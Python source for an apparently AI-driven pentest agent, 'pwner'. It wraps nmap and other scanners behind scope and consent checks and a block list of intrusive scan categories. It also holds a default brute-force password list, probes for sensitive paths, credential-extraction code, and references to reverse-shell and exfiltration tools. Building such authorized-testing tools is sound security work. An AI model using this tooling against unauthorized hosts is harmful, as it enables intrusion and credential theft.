"""Network pentest tools for pwner — nmap wrapper + DNS/banner/HTTP + safety rails.

The authorization boundary is the scope guard: build_dispatch wraps EVERY tool with
_enforce_scope, which rejects any host or network argument outside the operator's
authorized target before the tool body runs. Tools are in-scope-by-default, so one
that forgets its own _require_scope call is still guarded. High-impact actions
(brute-force, exploitation) additionally pass a consent gate, and intrusive NSE
categories (brute, dos, exploit) are block-listed in the generic run_nmap escape hatch.
"""
from __future__ import annotations

import asyncio
import base64
import ftplib
import ipaddress
import json
import os
import random
import re
import shutil
import socket
import subprocess
import sys
import xml.etree.ElementTree as ET
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlsplit

NMAP_BIN = os.environ.get("PWNER_NMAP", "nmap")
NUCLEI_BIN = os.environ.get("PWNER_NUCLEI", "nuclei")
HYDRA_BIN = os.environ.get("PWNER_HYDRA", "hydra")
SNMPWALK_BIN = os.environ.get("PWNER_SNMPWALK", "snmpwalk")


def has_nuclei() -> bool:
    return shutil.which(NUCLEI_BIN) is not None


def has_hydra() -> bool:
    return shutil.which(HYDRA_BIN) is not None


# Small built-in credential list so brute-force works without an external wordlist.
# Point `wordlist` at SecLists/rockyou for a real engagement.
DEFAULT_USERS = ["admin", "root", "administrator", "guest", "test", "user"]
DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "root", "toor", "admin123", "password123",
    "letmein", "welcome", "1234", "12345", "12345678", "qwerty", "secret",
    "test", "guest", "changeme", "password1", "admin1234", "p@ssw0rd",
]


class OperatorChannel:
    """Operator ⇄ agent channel for live steering + consent.

    Two modes:
    - classic (``managed=False``): drain() reads typed-ahead lines straight from
      stdin; consent() blocks on input(). Used by the one-shot interactive scan.
    - managed (``managed=True``): a live UI (the Textual TUI) owns input and
      *pushes* lines in with push(); consent() parks on a future the UI resolves with
      answer_consent(). This is what lets you keep typing while the agent works."""

    def __init__(self, managed: bool = False):
        self._buf: list[str] = []
        self.managed = managed
        self._consent_fut: asyncio.Future[str] | None = None
        self.consent_text: str | None = None

    def push(self, line: str) -> None:
        """Feed an operator line in (managed mode: called by the live input loop)."""
        self._buf.append(line)

    def has_pending(self) -> bool:
        """True if the operator typed something that hasn't been drained yet (managed mode).

        The agent loop uses this to interrupt a long-running tool so the operator's message
        is acted on right away instead of after the tool finishes."""
        return bool(self._buf)

    def drain(self) -> list[str]:
        """Return complete operator lines (non-blocking; used for live steering)."""
        out = list(self._buf)
        self._buf = []
        if not self.managed:  # classic mode: also sweep typed-ahead stdin
            import select
            while select.select([sys.stdin], [], [], 0)[0]:
                line = sys.stdin.readline()
                if line:
                    out.append(line.strip())
                else:
                    break
        return out

    async def prompt(self, text: str) -> str:
        print(text, end="", flush=True)
        ans = await asyncio.to_thread(input, "")
        return (ans or "").strip()

    # ---- consent -----------------------------------------------------------
    def consent_pending(self) -> bool:
        return self._consent_fut is not None and not self._consent_fut.done()

    def answer_consent(self, line: str) -> bool:
        """Resolve a parked consent request with the operator's line. True if one was waiting."""
        if self._consent_fut is not None and not self._consent_fut.done():
            self._consent_fut.set_result(line)
            return True
        return False

    async def consent(self, text: str) -> str:
        """Ask the operator a consent question and return their raw answer."""
        if not self.managed:
            return await self.prompt(text)
        # managed mode: show the question above the live box, park until answered
        print(text)
        loop = asyncio.get_event_loop()
        self._consent_fut = loop.create_future()
        self.consent_text = text
        try:
            return (await self._consent_fut or "").strip()
        finally:
            self._consent_fut = None
            self.consent_text = None


def _consent_granted(ctx: ScanContext) -> bool:
    """True if the operator approved high-impact actions (--auto-consent, or an
    earlier 'approved' consent decision). Brute-force/active steps require this."""
    if ctx.auto_consent:
        return True
    return any(r.get("decision") == "approved" for r in ctx.consent_requests)


async def _ask_consent(ctx: ScanContext, action: str, target: str, risk: str) -> bool:
    """Prompt the operator interactively for a high-impact action. Falls back to
    auto-approve/auto-deny in non-interactive mode."""
    if ctx.auto_consent:
        return True
    if not ctx.interactive:
        return False
    text = (f"\n  [!] pwner agent requests a HIGH-IMPACT action:\n"
            f"     action: {action}\n"
            f"     target: {target}\n"
            f"     risk:   {risk}\n"
            f"     approve? [y/N] ")
    try:
        ch = ctx.operator_channel
        if ch is not None:
            ans = await ch.consent(text)
        else:
            ans = await asyncio.to_thread(input, text)
    except (EOFError, KeyboardInterrupt, asyncio.CancelledError):
        ans = ""
    return (ans or "").strip().lower() in ("y", "yes", "a", "approve")


async def _consent(ctx: ScanContext, action: str, target: str, risk: str = "high") -> bool:
    """Resolve consent for an action: auto-approve, remembered approval, interactive
    prompt, or auto-deny. Records the decision so the prompt isn't repeated."""
    if ctx.auto_consent:
        return True
    if any(r.get("decision") == "approved" for r in ctx.consent_requests):
        return True
    ok = await _ask_consent(ctx, action, target, risk)
    ctx.consent_requests.append({"action": action, "target": target, "risk": risk,
                                 "decision": "approved" if ok else "denied"})
    return ok


def _nuclei_template_dir() -> str | None:
    """Locate the nuclei templates base directory (nuclei v3 doesn't always find it
    on its own). Env override PWNER_NUCLEI_TEMPLATES wins; then common install paths."""
    env = os.environ.get("PWNER_NUCLEI_TEMPLATES")
    if env and os.path.isdir(os.path.expanduser(env)):
        return os.path.expanduser(env)
    for p in ("~/nuclei-templates", "~/.local/nuclei-templates",
              "~/nuclei-templates-main", "~/.config/nuclei/templates"):
        full = os.path.expanduser(p)
        if os.path.isdir(full):
            return full
    return None


# Network-relevant nuclei categories. headless/javascript (browser/JS runtime),
# file/code/cloud (SAST/local/cloud) are excluded — slow or out of scope.
_NUCLEI_CATEGORIES = ("http", "network", "ssl", "dns")


def _nuclei_template_args() -> list[str]:
    """Build the `-t` args: env override (full dir), else the curated categories."""
    env = os.environ.get("PWNER_NUCLEI_TEMPLATES")
    if env and os.path.isdir(os.path.expanduser(env)):
        return ["-t", os.path.expanduser(env)]
    base = _nuclei_template_dir()
    if not base:
        return []
    dirs = [os.path.join(base, c) for c in _NUCLEI_CATEGORIES
            if os.path.isdir(os.path.join(base, c))]
    return ["-t", ",".join(dirs)] if dirs else ["-t", base]


def expand_hosts(target: str, cap: int = 4096) -> list[str]:
    """Expand a CIDR target into individual host strings. Single hosts pass through."""
    t = (target or "").strip()
    if "/" not in t:
        return [t]
    try:
        net = ipaddress.ip_network(t, strict=False)
    except ValueError:
        return [t]
    if net.num_addresses > cap:
        raise ToolError(f"range too large ({net.num_addresses} addresses) — cap is {cap}. "
                        f"Narrow the CIDR or raise --range-cap.")
    addrs = list(net.hosts())
    if not addrs:
        addrs = [net.network_address]
    return [str(ip) for ip in addrs]

# Intrusive/destructive NSE categories the agent may NOT request via run_nmap.
BLOCKED_SCRIPT_CATEGORIES = {"brute", "dos", "exploit", "intrusive", "broadcast", "external"}
ALLOWED_SCRIPT_ARGS_HINT = "vuln,safe,default,discovery,version"

# Port presets -> nmap args (each value is a list of argv tokens).
PORT_PRESETS = {
    "top-1000": ["--top-ports", "1000"],
    "top-100": ["--top-ports", "100"],
    "common": ["--top-ports", "1000"],
    "all": ["-p", "1-65535"],
}


class ToolError(RuntimeError):
    """A user-facing tool failure (nmap missing, out of scope, timeout, ...)."""


@dataclass
class ScanContext:
    target: str
    max_rate: int = 1000
    timing: str = "T4"
    findings: list[dict] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)
    consent_requests: list[dict] = field(default_factory=list)
    auto_consent: bool = False  # --auto-consent: approve consent gates (use with care)
    interactive: bool = False   # prompt [y/N] on high-impact actions instead of auto-deny
    range_cap: int = 4096
    concurrency: int = 20
    nuclei_severity: str = "low,medium,high,critical"
    operator_channel: Any = None  # OperatorChannel for live steering + interactive consent
    tui: Any = None               # TUI for live log + topology panel (None = plain print)
    exploit: Any = None           # ExploitState: reverse-shell listener + exfil channel (lazy)
    http_cookies: Any = None      # shared cookie jar so web tools stay logged in across calls
    scheme_cache: dict = field(default_factory=dict)  # (host,port) -> "http"/"https", probed once
    ledger: Any = None            # engagement working-memory (surface/creds/hypotheses/tried)

    def scope_networks(self) -> list:
        """Return ip_network objects for CIDR targets, else [] (single host)."""
        t = (self.target or "").strip()
        nets = []
        for part in t.split(","):
            part = part.strip()
            if "/" in part and not part.startswith(("http://", "https://")):
                try:
                    nets.append(ipaddress.ip_network(part, strict=False))
                except ValueError:
                    pass
        return nets


def _resolve_ips(host: str) -> list[str]:
    """Resolve a hostname/IP to a list of IP strings (best effort, no errors)."""
    host = host.strip().lower().rstrip(".")
    try:
        ipaddress.ip_address(host)
        return [host]
    except ValueError:
        pass
    try:
        infos = socket.getaddrinfo(host, None, socket.AF_INET)
        return list(dict.fromkeys(i[4][0] for i in infos))
    except (socket.gaierror, OSError):
        return []


def in_scope(host: str, ctx: ScanContext) -> bool:
    """True if `host` is the authorized target (single host) or inside its CIDR."""
    if not (ctx.target or "").strip():
        return True
    host = host.strip().lower().rstrip(".")
    nets = ctx.scope_networks()
    if nets:
        for ip in _resolve_ips(host):
            try:
                if any(ipaddress.ip_address(ip) in n for n in nets):
                    return True
            except ValueError:
                continue
        return False
    # Single-host target: allow the exact hostname/IP and its resolved IPs.
    target = ctx.target.strip().lower().rstrip(".")
    if host == target:
        return True
    return bool(set(_resolve_ips(host)) & set(_resolve_ips(target)))


def _require_scope(host: str, ctx: ScanContext) -> None:
    if not in_scope(host, ctx):
        raise ToolError(f"{host!r} is outside the authorized scope ({ctx.target!r})")


# ── Central scope enforcement ────────────────────────────────────────────────
# Tool arguments whose value names a network host or network. Every tool call is
# checked against these in build_dispatch, so being in scope is the default: a new
# tool, or one whose body forgets _require_scope, still cannot reach a host the
# operator never authorized. `domain` is deliberately NOT here — in the AD tools it
# is a Kerberos realm ("CORP.LOCAL"), not a host to send traffic to, and dns_enum
# asks a public resolver about a name rather than touching the target.
_SCOPED_ARG_NAMES = ("target", "targets", "host", "hosts", "dc_ip", "server", "ip")

# Tools with no network target to check: scope setup itself, local bookkeeping,
# offline cracking, third-party lookups, and our own attacker-side infrastructure
# (listener/exfil bind locally; shell_exec runs over an already-established session).
_SCOPE_EXEMPT_TOOLS = frozenset({
    "set_target", "note", "report_finding", "get_findings", "ledger", "request_consent",
    "attacker_info", "exploit_search", "hash_crack", "listener", "exfil", "shell_exec",
})


def _hosts_in_value(value: Any) -> list[str]:
    """Pull the host/network literals out of one tool argument. Accepts a bare host or
    IP, a CIDR, 'host:port', an absolute URL, a comma-separated list, or a list of any
    of those (nuclei_scan takes up to 500 targets as a list)."""
    if value is None or isinstance(value, bool):
        return []
    if isinstance(value, (list, tuple, set)):
        out: list[str] = []
        for v in value:
            out.extend(_hosts_in_value(v))
        return out
    text = str(value).strip()
    if not text:
        return []
    found: list[str] = []
    for part in text.split(","):
        part = part.strip()
        if not part:
            continue
        if "://" in part:  # http://host:8443/login -> host
            part = urlsplit(part).hostname or ""
        elif part.startswith("["):  # [2001:db8::1]:443 -> 2001:db8::1
            part = part[1:].split("]", 1)[0]
        elif part.count(":") == 1 and "/" not in part:  # host:445 -> host (IPv6 kept whole)
            part = part.split(":", 1)[0]
        part = part.strip()
        if part:
            found.append(part)
    return found


def _literal_in_scope(literal: str, ctx: ScanContext) -> bool:
    """Scope test for one literal, which may be a host OR a CIDR network. A network
    argument (ping_sweep over a subnet) has to sit entirely inside the authorization,
    so a /24 scope can never be widened to a /16 by a tool argument."""
    if not (ctx.target or "").strip():
        return True  # no scope configured yet — set_target establishes it
    if "/" not in literal:
        return in_scope(literal, ctx)
    try:
        net = ipaddress.ip_network(literal, strict=False)
    except ValueError:
        return in_scope(literal, ctx)  # not a network after all (e.g. a URL path slipped in)
    nets = [n for n in ctx.scope_networks() if n.version == net.version]
    if nets:
        return any(net.subnet_of(n) for n in nets)
    if net.num_addresses == 1:  # /32 or /128 of a single-host scope
        return in_scope(str(net.network_address), ctx)
    return False


def _enforce_scope(tool: str, args: dict, ctx: ScanContext) -> None:
    """Scope-check every host-carrying argument of one tool call. Raises ToolError on
    the first literal outside the authorized scope."""
    if tool in _SCOPE_EXEMPT_TOOLS or not isinstance(args, dict):
        return
    for key in _SCOPED_ARG_NAMES:
        if key not in args:
            continue
        for literal in _hosts_in_value(args[key]):
            if not _literal_in_scope(literal, ctx):
                raise ToolError(
                    f"{literal!r} (argument {key!r} of {tool}) is outside the authorized "
                    f"scope ({ctx.target!r}). Only the operator can widen scope — ask them, "
                    f"then set_target.")


async def _run_nmap(ctx: ScanContext, *args: str, timeout: float = 300.0) -> dict:
    """Run nmap with XML output and parse it. Returns a compact host summary."""
    timing = ctx.timing or "T4"
    if not timing.startswith("T"):
        timing = "T" + timing
    # No fixed --host-timeout: a full-range scan legitimately takes minutes, and a hard 60s cap made
    # nmap abort the host and report "0 open" — a dangerous false negative. The asyncio wait_for
    # below (per-call `timeout`) is the real guard; script-timeout still bounds individual NSE scripts.
    cmd = [NMAP_BIN, "-oX", "-", "-n", "-" + timing, "--max-rate", str(ctx.max_rate),
           "--script-timeout", "20s", *args]
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    except FileNotFoundError:
        raise ToolError("nmap not found. Install it: `brew install nmap` (macOS) "
                        "or `sudo apt install nmap` (Linux), or set PWNER_NMAP to the binary path.") from None
    try:
        out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        await proc.wait()
        raise ToolError(f"nmap timed out after {timeout:.0f}s") from None
    if proc.returncode != 0:
        raise ToolError(f"nmap exited {proc.returncode}: {err.decode('utf-8', 'replace')[:300]}")
    return _parse_nmap_xml(out.decode("utf-8", "replace"))


def _parse_nmap_xml(xml_text: str) -> dict:
    root = ET.fromstring(xml_text)
    hosts = []
    for host in root.findall("host"):
        h: dict[str, Any] = {"status": "unknown", "addresses": [], "ports": [], "os": [], "hostscript": []}
        st = host.find("status")
        if st is not None:
            h["status"] = st.get("state", "unknown")
        for addr in host.findall("address"):
            h["addresses"].append({"addr": addr.get("addr"), "type": addr.get("addrtype")})
        ports_el = host.find("ports")
        if ports_el is not None:
            for port in ports_el.findall("port"):
                pst = port.find("state")
                state = pst.get("state", "unknown") if pst is not None else "unknown"
                svc_el = port.find("service")
                service = {}
                if svc_el is not None:
                    service = {
                        "name": svc_el.get("name", ""),
                        "product": svc_el.get("product", ""),
                        "version": svc_el.get("version", ""),
                        "extrainfo": svc_el.get("extrainfo", ""),
                        "tunnel": svc_el.get("tunnel", ""),
                    }
                scripts = []
                for s in port.findall("script"):
                    scripts.append({"id": s.get("id", ""), "output": (s.get("output") or "").strip()[:800]})
                h["ports"].append({
                    "port": int(port.get("portid", "0")),
                    "protocol": port.get("protocol", "tcp"),
                    "state": state,
                    "service": service,
                    "scripts": scripts,
                })
        os_el = host.find("os")
        if os_el is not None:
            for osm in os_el.findall("osmatch"):
                h["os"].append({"name": osm.get("name", ""), "accuracy": osm.get("accuracy", "")})
        for s in host.findall("hostscript"):
            for sc in s.findall("script"):
                h["hostscript"].append({"id": sc.get("id", ""), "output": (sc.get("output") or "").strip()[:800]})
        hosts.append(h)
    return {"hosts": hosts}


def _summarize(parsed: dict, open_only: bool = True) -> dict:
    """Turn parsed nmap XML into a compact, model-friendly dict."""
    out: list[dict] = []
    for h in parsed.get("hosts", []):
        ports = []
        for p in h.get("ports", []):
            if open_only and p["state"] != "open":
                continue
            ports.append({
                "port": p["port"],
                "protocol": p["protocol"],
                "state": p["state"],
                "service": p["service"],
                "scripts": [{"id": s["id"], "output": s["output"]} for s in p.get("scripts", [])],
            })
        out.append({
            "address": ", ".join(a["addr"] for a in h.get("addresses", [])),
            "status": h["status"],
            "open_ports": ports,
            "os_matches": h.get("os", [])[:3],
            "host_scripts": h.get("hostscript", []),
        })
    return {"hosts": out}


def _ports_arg_list(ports: str) -> list[str]:
    """Translate a ports selector into nmap argv tokens. Empty -> nmap default."""
    p = (ports or "").strip().lower()
    if not p:
        return []
    if p in PORT_PRESETS:
        return PORT_PRESETS[p]
    # explicit list or range: validate loosely, pass through
    return ["-p", p]


# ── Tool implementations (each: async, takes dict args, returns dict) ──────────

def _guard_nmap_args(raw: str) -> list[str]:
    """Validate LLM-supplied nmap flags and return them as tokens. The ONLY thing enforced is the
    safety mechanism — destructive/intrusive NSE categories are refused. Everything else (-Pn, -sV,
    -p-, timing, detection scripts, ...) is the agent's to decide."""
    raw = (raw or "").strip()
    if not raw:
        return []
    low = raw.lower()
    blocked = [c for c in BLOCKED_SCRIPT_CATEGORIES if "--script" in low and c in low]
    if blocked:
        raise ToolError(f"refused: destructive/intrusive script category in nmap_args: "
                        f"{', '.join(blocked)}. Allowed detection categories: {ALLOWED_SCRIPT_ARGS_HINT}")
    return raw.split()


async def port_scan(ctx: ScanContext, args: dict) -> dict:
    host = str(args.get("target") or ctx.target)
    _require_scope(host, ctx)
    syn = os.geteuid() == 0 if hasattr(os, "geteuid") else False
    scan_type = "-sS" if syn else "-sT"
    ports_sel = str(args.get("ports", "top-1000")).strip().lower()
    extra = _guard_nmap_args(str(args.get("nmap_args") or ""))  # agent-chosen flags (e.g. -Pn)
    # A full/large scan needs far more wall-clock than the 300s default, or it gets cut off mid-scan.
    timeout = 1200.0 if ports_sel in ("all", "1-65535") else 300.0
    parsed = await _run_nmap(ctx, scan_type, *extra, *_ports_arg_list(ports_sel), host, timeout=timeout)
    return _summarize(parsed)


async def service_detect(ctx: ScanContext, args: dict) -> dict:
    host = str(args.get("target") or ctx.target)
    _require_scope(host, ctx)
    extra = _guard_nmap_args(str(args.get("nmap_args") or ""))
    parsed = await _run_nmap(ctx, "-sV", "--version-light", *extra,
                             *_ports_arg_list(str(args.get("ports", ""))), host)
    return _summarize(parsed)


async def vuln_scan(ctx: ScanContext, args: dict) -> dict:
    host = str(args.get("target") or ctx.target)
    _require_scope(host, ctx)
    extra = _guard_nmap_args(str(args.get("nmap_args") or ""))
    parsed = await _run_nmap(ctx, "-sV", "--script", "vuln", *extra,
                             *_ports_arg_list(str(args.get("ports", ""))), host)
    return _summarize(parsed)


def _is_root() -> bool:
    return hasattr(os, "geteuid") and os.geteuid() == 0


async def os_detect(ctx: ScanContext, args: dict) -> dict:
    host = str(args.get("target") or ctx.target)
    _require_scope(host, ctx)
    if not _is_root():  # -O needs raw sockets; give a clear note instead of a raw nmap error
        return {"hosts": [], "note": "OS detection needs root — re-run pwner with sudo for -O."}
    extra = _guard_nmap_args(str(args.get("nmap_args") or ""))
    parsed = await _run_nmap(ctx, "-O", *extra, host)
    return _summarize(parsed, open_only=False)


async def ping_sweep(ctx: ScanContext, args: dict) -> dict:
    target = str(args.get("target") or ctx.target)
    # Host discovery is far weaker without root: ICMP echo/timestamp and ARP all need
    # raw sockets. Unprivileged, we lean on TCP-SYN(connect) probes to many common ports
    # so hosts that ignore 80/443 still get found; with root we add ICMP + ARP + UDP.
    if _is_root():
        probes = ["-sn", "-PE", "-PP", "-PM",
                  "-PS21,22,23,25,80,135,139,443,445,3389,8080",
                  "-PA80,443,3389", "-PU40125"]
    else:
        probes = ["-sn", "-PS21,22,23,25,53,80,110,135,139,143,443,445,993,995,3306,3389,5432,8080,8443"]
    parsed = await _run_nmap(ctx, *probes, target, timeout=600.0)
    live = [h["address"] for h in _summarize(parsed, open_only=False)["hosts"] if h["status"] == "up"]
    out = {"live_hosts": live, "count": len(live)}
    if not _is_root():
        out["note"] = ("unprivileged host discovery (TCP-SYN probes only) — some hosts that "
                       "block those ports won't answer. Re-run pwner with sudo for ICMP + ARP "
                       "discovery, which finds many more hosts on a LAN.")
    return out


async def dns_enum(ctx: ScanContext, args: dict) -> dict:
    import dns.asyncresolver
    domain = str(args.get("domain") or ctx.target).strip().lower().rstrip(".")
    out: dict[str, list[str]] = {}
    for rtype in ("A", "AAAA", "CNAME", "MX", "NS", "TXT"):
        try:
            ans = await dns.asyncresolver.resolve(domain, rtype, lifetime=8)
            out[rtype] = [str(r) for r in ans][:20]
        except Exception:
            out[rtype] = []
    return {"domain": domain, "records": out}


async def banner_grab(ctx: ScanContext, args: dict) -> dict:
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 0))
    if not (1 <= port <= 65535):
        raise ToolError("invalid port")
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=8)
        writer.write(b"\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(2048), timeout=6)
        writer.close()
        await writer.wait_closed()
        return {"host": host, "port": port, "banner": data.decode("utf-8", "replace").strip()[:1000]}
    except asyncio.TimeoutError:
        return {"host": host, "port": port, "banner": "", "note": "no banner (timeout)"}
    except (ConnectionRefusedError, OSError) as e:
        return {"host": host, "port": port, "banner": "", "note": f"connect failed: {e}"}


def _tls_handshake_ok(host: str, port: int, timeout: float = 4.0) -> bool:
    """True if host:port completes a TLS handshake — so we pick https vs http correctly on ANY
    port (8443, 9443, ...), not just 443."""
    import ssl
    sctx = ssl.create_default_context()
    sctx.check_hostname = False
    sctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            with sctx.wrap_socket(sock, server_hostname=host):
                return True
    except Exception:  # noqa: BLE001 — not TLS (plain HTTP), filtered, refused, etc.
        return False


async def _scheme_for(ctx: ScanContext, host: str, port: int, explicit: str | None = None) -> str:
    """Pick http/https for host:port. Honors an explicit scheme, short-circuits 80/443, else probes
    the TLS handshake ONCE per (host,port) and caches it — fixes the old port==443-only assumption."""
    if explicit in ("http", "https"):
        return explicit
    if port == 80:
        return "http"
    if port == 443:
        return "https"
    cache = ctx.scheme_cache
    key = (host, port)
    if key not in cache:
        cache[key] = "https" if await asyncio.to_thread(_tls_handshake_ok, host, port) else "http"
    return cache[key]


def _sync_cookies(ctx: ScanContext, client) -> None:
    """Persist the cookies a client collected (incl. across redirects) back onto the ctx jar so the
    NEXT web tool call is still logged in."""
    try:
        ctx.http_cookies = client.cookies
    except Exception:  # noqa: BLE001
        pass


def _collected_set_cookie(r) -> str:
    """All Set-Cookie headers across the redirect chain — so a login 302's cookie isn't hidden by
    the final 200 (httpx only exposes the final response's headers)."""
    out = []
    for resp in list(getattr(r, "history", []) or []) + [r]:
        sc = resp.headers.get("set-cookie", "")
        if sc:
            out.append(sc)
    return " || ".join(out)[:600]


async def http_probe(ctx: ScanContext, args: dict) -> dict:
    import httpx
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 80))
    path = str(args.get("path") or "/")
    scheme = await _scheme_for(ctx, host, port, args.get("scheme"))
    url = f"{scheme}://{host}:{port}{path}"
    try:
        async with httpx.AsyncClient(timeout=10.0, verify=False, follow_redirects=True,
                                     cookies=ctx.http_cookies) as c:
            r = await c.get(url)
            _sync_cookies(ctx, c)
        parsed = _parse_html(r.text)
        return {"url": url, "status": r.status_code,
                "server": r.headers.get("server", ""),
                "content_type": r.headers.get("content-type", ""),
                "title": parsed["title"],
                "links": parsed["links"][:40],
                "forms": parsed["forms"],
                "comments": parsed["comments"][:10],
                "body_excerpt": parsed["text"][:1500],
                "headers": dict(list(r.headers.items())[:20])}
    except Exception as e:  # noqa: BLE001
        return {"url": url, "error": f"{type(e).__name__}: {str(e)[:200]}"}


def _parse_html(text: str) -> dict:
    """Pull the useful structure out of an HTML page so the agent can actually read the app:
    title, links, forms (action/method/input names), HTML comments, and a tag-stripped text excerpt."""
    body = text or ""
    title = ""
    m = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
    if m:
        title = re.sub(r"\s+", " ", m.group(1)).strip()[:200]
    links = re.findall(r'(?:href|src|action)\s*=\s*["\']([^"\']+)["\']', body, re.I)
    links = list(dict.fromkeys(
        a.strip() for a in links if a.strip() and not a.lower().startswith(("data:", "javascript:", "#"))))
    comments = [c.strip()[:200] for c in re.findall(r"<!--(.*?)-->", body, re.S) if c.strip()]
    forms = []
    for fm in re.findall(r"<form\b(.*?)</form>", body, re.I | re.S):
        a = re.search(r'action\s*=\s*["\']([^"\']*)["\']', fm, re.I)
        md = re.search(r'method\s*=\s*["\']([^"\']*)["\']', fm, re.I)
        inputs = re.findall(r'<(?:input|textarea|select)\b[^>]*name\s*=\s*["\']([^"\']+)["\']', fm, re.I)
        forms.append({"action": a.group(1) if a else "", "method": (md.group(1) if md else "get").upper(),
                      "inputs": inputs[:20]})
    txt = re.sub(r"<script\b.*?</script>", " ", body, flags=re.I | re.S)
    txt = re.sub(r"<style\b.*?</style>", " ", txt, flags=re.I | re.S)
    txt = re.sub(r"<[^>]+>", " ", txt)
    txt = re.sub(r"\s+", " ", txt).strip()
    return {"title": title, "links": links, "forms": forms, "comments": comments, "text": txt}


# Common paths probed by content_discovery (mapped early to reveal a web app's attack surface).
_COMMON_PATHS = [
    "/", "/robots.txt", "/sitemap.xml", "/.git/HEAD", "/.env", "/admin", "/administrator",
    "/login", "/logout", "/register", "/signup", "/dashboard", "/home", "/index.php",
    "/api", "/api/v1", "/api/v2", "/docs", "/swagger", "/swagger.json", "/openapi.json",
    "/graphql", "/console", "/debug", "/status", "/health", "/metrics", "/server-status",
    "/phpinfo.php", "/info.php", "/test", "/dev", "/staging", "/backup", "/backups",
    "/config", "/config.php", "/settings", "/uploads", "/upload", "/files", "/static",
    "/assets", "/js", "/css", "/users", "/user", "/account", "/profile", "/portal",
    "/internal", "/private", "/secret", "/data", "/db", "/logs", "/wp-login.php",
    "/wp-admin/", "/.htaccess", "/web.config", "/flag", "/flag.txt",
]


async def content_discovery(ctx: ScanContext, args: dict) -> dict:
    """Map a web app's hidden paths: probe a built-in list (+ any supplied) and report what exists."""
    import httpx
    host = str(args.get("host") or args.get("target") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 80))
    scheme = await _scheme_for(ctx, host, port, args.get("scheme"))
    base = f"{scheme}://{host}:{port}"
    extra = args.get("paths") or []
    if isinstance(extra, str):
        extra = [p.strip() for p in extra.split(",") if p.strip()]
    paths = list(dict.fromkeys(_COMMON_PATHS + [str(p) for p in extra]))
    sem = asyncio.Semaphore(min(20, (ctx.concurrency or 20)))

    async with httpx.AsyncClient(timeout=8.0, verify=False, follow_redirects=False,
                                 cookies=ctx.http_cookies) as c:
        async def probe(p: str):
            url = base + (p if p.startswith("/") else "/" + p)
            async with sem:
                try:
                    r = await c.get(url)
                except Exception:  # noqa: BLE001
                    return None
            if r.status_code == 404:
                return None
            loc = r.headers.get("location", "") if 300 <= r.status_code < 400 else ""
            return {"path": p, "status": r.status_code, "len": len(r.content), "redirect": loc}
        results = await asyncio.gather(*[probe(p) for p in paths])
    found = sorted((x for x in results if x), key=lambda x: (x["status"], x["path"]))
    return {"base": base, "tested": len(paths), "found": found}


async def web_request(ctx: ScanContext, args: dict) -> dict:
    """Send a custom HTTP request and return the parsed response — for testing endpoints, logins,
    parameters, auth bypass and IDOR (i.e. actually exercising the web app's own logic). Cookies
    persist across calls, so once you log in you stay authenticated. For a RAW body (binary upload,
    exact bytes) pass `body` (text) or `body_b64` (base64-decoded to bytes)."""
    import base64 as _b64

    import httpx
    host = str(args.get("host") or "")
    _require_scope(host, ctx)
    port = int(args.get("port", 80))
    method = str(args.get("method") or "GET").upper()
    path = str(args.get("path") or "/")
    scheme = await _scheme_for(ctx, host, port, args.get("scheme"))
    url = f"{scheme}://{host}:{port}{path if path.startswith('/') else '/' + path}"
    headers = args.get("headers") if isinstance(args.get("headers"), dict) else {}
    params = args.get("params") if isinstance(args.get("params"), dict) else None
    data = args.get("data")
    json_body = args.get("json")
    content = None  # raw request body (bytes) — for binary uploads / exact bytes
    if args.get("body_b64"):
        try:
            content = _b64.b64decode(str(args["body_b64"]))
        except Exception:  # noqa: BLE001
            return {"url": url, "error": "body_b64 is not valid base64"}
    elif args.get("body") is not None:
        content = str(args["body"]).encode("utf-8", "replace")
    try:
        async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=True,
                                     cookies=ctx.http_cookies) as c:
            r = await c.request(method, url, headers=headers, params=params,
                                data=data if content is None else None,
                                json=json_body if content is None else None, content=content)
            _sync_cookies(ctx, c)
    except Exception as e:  # noqa: BLE001
        return {"url": url, "error": f"{type(e).__name__}: {str(e)[:200]}"}
    ctype = r.headers.get("content-type", "").lower()
    parsed = _parse_html(r.text) if "html" in ctype else {
        "title": "", "links": [], "forms": [], "comments": [], "text": r.text[:2500]}
    return {"url": url, "method": method, "status": r.status_code, "content_type": ctype,
            "set_cookie": _collected_set_cookie(r),
            "title": parsed["title"], "links": parsed["links"][:40], "forms": parsed["forms"],
            "comments": parsed["comments"][:10], "body_excerpt": (parsed["text"] or r.text)[:2500],
            "headers": dict(list(r.headers.items())[:20])}


def _extract_strings(data: bytes, minlen: int = 4) -> list[str]:
    """Printable-ASCII runs out of a binary blob (like `strings`) — makes a pcap/zip/binary
    readable enough to spot cleartext content the parsed-HTML path would mangle or truncate away."""
    out: list[str] = []
    cur = bytearray()
    for b in data:
        if b == 9 or 32 <= b < 127:
            cur.append(b)
        else:
            if len(cur) >= minlen:
                out.append(cur.decode("ascii", "replace"))
            cur = bytearray()
    if len(cur) >= minlen:
        out.append(cur.decode("ascii", "replace"))
    return out


def _scan_creds(data: bytes) -> list[str]:
    """Flag credential-looking content in a downloaded blob — target-agnostic: HTTP Basic auth
    (decoded), cleartext FTP USER/PASS, and generic user/password/token=value pairs. Used to pull
    secrets out of captures, backups, config and source files."""
    hits: list[str] = []
    for b64 in re.findall(rb"[Aa]uthorization:\s*[Bb]asic\s+([A-Za-z0-9+/=]{8,})", data):
        try:
            dec = base64.b64decode(b64).decode("utf-8", "replace")
            if ":" in dec and dec.isprintable():
                hits.append(f"HTTP Basic auth -> {dec}")
        except Exception:  # noqa: BLE001
            pass
    for verb, val in re.findall(rb"(?im)^\s*(USER|PASS)\s+(\S.*?)\r?$", data):
